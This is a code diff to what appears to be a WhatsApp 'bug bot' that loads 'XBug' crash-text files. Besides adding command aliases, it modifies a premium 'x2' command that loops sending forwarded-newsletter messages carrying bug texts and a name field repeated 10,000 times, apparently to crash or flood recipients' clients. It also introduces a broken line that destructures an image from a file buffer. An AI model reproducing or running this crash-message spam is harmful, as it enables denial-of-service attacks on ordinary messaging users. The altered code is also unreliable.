@@ -148,8 +148,7 @@ const { xeontext5 } = require('./src/data/function/XBug/xeontext5')
 const { xeontext6 } = require('./src/data/function/XBug/xeontext6')
 const wkwk = fs.readFileSync(`./src/data/function/XBug/x.mp3`)
 const xsteek = fs.readFileSync(`./src/data/function/XBug/x.webp`)
-
-const menuimg1 = fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`)
+const {menuimg1} = fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`)
 
 //store database
 const db_respon_list = JSON.parse(fs.readFileSync('./src/store/list.json'))
@@ -3221,7 +3220,7 @@ case 'listowner': {
 
         }
         break
-            case 'shutdown':
+            case 'shutdown': case 'restart' :
                 if (!XeonTheCreator) return XeonStickOwner()
                 replygcxeon(`Restarting will be completed in seconds`)
                 await sleep(3000)
@@ -6947,7 +6946,7 @@ break
                     })
             break
                 //bot status
-                case 'ping': case 'botstatus': case 'statusbot': case 'p':
+                case 'ping': case 'botstatus': case 'statusbot': case 'p': case 'test' :
                   await XeonBotInc.sendMessage(m.chat, { react: { text: `🛜`, key: m.key }})
                   let ping_quote = { key: 
                     { fromMe: false, 
@@ -29309,9 +29308,9 @@ break
 case 'x2': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
-amount = text * 30
+amount = text
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: xeontext1 + xeontext2 + xeontext3, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${xeontext2}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 }
 break
